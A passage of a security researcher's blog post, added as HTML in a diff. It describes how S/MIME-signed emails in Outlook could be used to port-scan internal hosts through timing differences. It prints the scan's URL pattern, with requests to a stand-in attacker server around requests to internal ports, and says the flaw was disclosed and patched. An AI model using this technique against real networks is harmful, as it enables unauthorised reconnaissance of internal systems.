+triggered by an S/MIME-signed email when opened in Microsoft
+Outlook (or other Microsoft mail clients using the CryptoAPI
+functionality). This allowed attackers to trigger arbitrary
+HTTP requests (also to internal networks) but not gaining
+any information about the result of the request. Also,
+because the request was done using CryptoAPI and not in
+a browser, it was impossible to exploit any kind of Cross
+Site Request Forgery issues in web applications, so the
+impact of the vulnerability was quite limited. In fact, I would consider this
+mostly privacy issue because the most interesting application was to find out that an email
+had been opened (and from which IP address and with which
+version of CryptoAPI), something that was otherwise (to my knowledge)
+pretty much impossible in Outlook (<a href="https://www.emailprivacytester.com">emailprivacytester.com</a>, a very interesting service with many tests for email privacy
+issues seems to confirm that).
+</p>
+
+<h2>Revisiting the issue</h2>
+
+<p>
+In May 2012, I revisited the issue to see if something that
+I had been thinking about previously could be implemented &ndash; leveraging the issue to do port scanning on
+internal hosts by alternating between internal and external HTTP
+requests and measuring the timing distance on the (attacker-controlled)
+external host. It turned out that in a specific combination of nested
+S/MIME signatures with particularly long URLs (about 3500 characters, don&#8217;t ask my why exactly they are needed),
+one can actually observe a difference in timing between an open port or a closed port.
+<p>
+To test this, URLs that are triggered by the email would for example
+look similar to the following:
+<ol>
+        <li>http://[attacker_server]/record_start?port=<i>1</i>&amp;[3500*A]
+        <li>http://[internal_target_ip]:<i>1</i>/[3500*A]</li>
+        <li>http://[attacker_server]/record_stop?port=<i>1</i>&amp;[3500*A]
+        <li>&hellip;
+</ol>
+The scripts &raquo;record_start&laquo; and &raquo;record_stop&laquo; on the server are used to measure the time difference between the two external requests (1 and 3), with which we can tell (roughly) how long the internal request to port 1 on the internal target IP took.
+</p>
+
+<p>
+Testing showed that in case the port is open, the time difference measured between
+the two external requests was significantly <i>below</i> one second, while
+if the port was closed, it was a bit <i>above</i> one second.
+</p>
+
+<p>
+Unfortunately, we are not able to observe this for all possible ports.
+The timing difference for some HTTP request to a list of well-known
+ports was short regardless of whether they are open or closed, making
+it impossible to determine their state. My current assumption is that
+this is because the HTTP client library used by CryptoAPI does not allow
+connections on those ports to avoid speaking HTTP(S) on them (similar to
+browsers which typically make it impossible to speak HTTP on port 25).
+</p>
+
+<p>
+A single email can be used to scan the 50 most-used (as determined by
+<a href="http://nmap.org/book/nmap-services.html">nmap</a>) ports on a single host. A proof-of-concept which scans 127.0.0.1
+has been implemented and can be tried out by sending an empty email
+to <a href="mailto:smime-http-portscan@klink.name">smime-http-portscan@klink.name</a>. You will receive an automatic
+reply with an S/MIME-signed message which when opened will trigger
+a number of HTTP requests to ports on local host and a data logger
+running on my webserver. After a few minutes, you can check on a
+web interface to see which ports are open and which ones are closed.
+Sometimes, your Exchange mail server might prevent the test email
+from being delivered though because it contains a lot of nested
+MIME parts (try again with a more relaxed mailserver then ;-)).
+</p>
+
+<h2>Problem solved</h2>
+<p>
+After repeatedly bugging the Microsoft Security Response team about the issue
+(and accidentally discovering an exploitable WriteAV
+issue when too many S/MIME signatures were used &ndash; <a href="https://technet.microsoft.com/en-us/security/bulletin/MS13-068">MS13-068</a>, fixed in the October 2013 patch day), this has now been
+fixed with the November 2013 patch day release
+(CVE-2013-3870). In case the id-ad-caissuers functionality
+is actually needed in an organization, the functionality can be turned
+on again, though &ndash; with the risk of still being vulnerable to this
+issue.
+</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/blog/archives">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+  </div>
+</div>
+<aside class="sidebar">
+  <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2019/07/28/turning-off-certificate-validation-with-java-instrumentation/">Turning off certificate validation with Java instrumentation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/03/26/pdml2sbud/">pdml2sbud - pretty network packets in your terminal</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/02/05/introducing-tmpnix-an-alternative-to-static-binaries-for-post-exploitation/">Introducing tmpnix - an alternative to static binaries for post exploitation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/01/27/the-jekyll-and-hyde-pdf/">The strange case of the Jekyll and Hyde PDF</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/08/17/how-to-transform-camels-purescript-haskell/">How to turn a Dromedary camel into a Bactrian camel</a>
+      </li>
+    
+  </ul>
+</section>
+
+  
+
+  <section>
+    <a href="/about/">Impressum/Imprint</a>
+  </section>
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+Copyright &copy; 2019 - <a href="http://www.alech.de">Alexander Klink</a> (<a href="/about/">Impressum</a>) -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
